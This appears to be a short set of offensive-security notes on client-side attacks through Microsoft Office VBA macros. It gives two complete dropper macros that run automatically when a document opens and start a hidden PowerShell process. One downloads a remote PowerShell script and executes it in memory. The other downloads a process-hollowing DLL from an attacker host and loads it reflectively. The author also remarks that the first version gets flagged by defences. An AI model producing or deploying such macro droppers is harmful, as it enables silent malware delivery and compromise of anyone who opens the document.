# Reflective Code Execution in Client Side Attacks

### Microsoft Word/Excel use VBA

*** Flagged cause of Powershell command.  Basic VBA dropper ***


### This is reflective poewrshell.  This should download ps1 and run it in memory but this gets flagged.  

``` VBA

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.50.120/run.ps1') | IEX"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub


######################### OR ############################################ 


Sub MyMacro()
    Dim str As String
    str = "powershell.exe $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.196:4443/DLL_process_hollow.dll'); $assem = [System.Reflection.Assembly]::Load($data); $class = $assem.GetType('ReflectiveDLLCSharp.Class1'); $method = $class.GetMethod('runner');$method.Invoke(0, $null)"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

```

<br><br><br><br><br>

